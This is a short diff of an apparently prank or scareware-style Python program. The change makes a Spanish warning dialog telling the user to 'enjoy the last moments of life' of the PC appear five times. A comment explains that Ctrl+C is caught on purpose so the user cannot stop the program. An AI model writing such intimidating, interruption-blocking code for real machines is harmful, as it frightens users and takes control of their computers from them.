@@ -95,9 +95,8 @@ def set_wallpapers():
                     
                     break
 #              Muestra un mensaje en pantalla con la siguiente información
-
-               messagebox.askquestion(title="Sigues ahi?", message="Sigues usando el pc? disfruta sus  ultimos instantes de vida")
-     
+               for _ in range(5):
+                    messagebox.askquestion(title="Sigues ahi?", message="Sigues usando el pc? disfruta sus  ultimos instantes de vida")
 #    Para que el usuario no pueda intentar parar el programa presionando ctrl + c
      except KeyboardInterrupt:
           pass
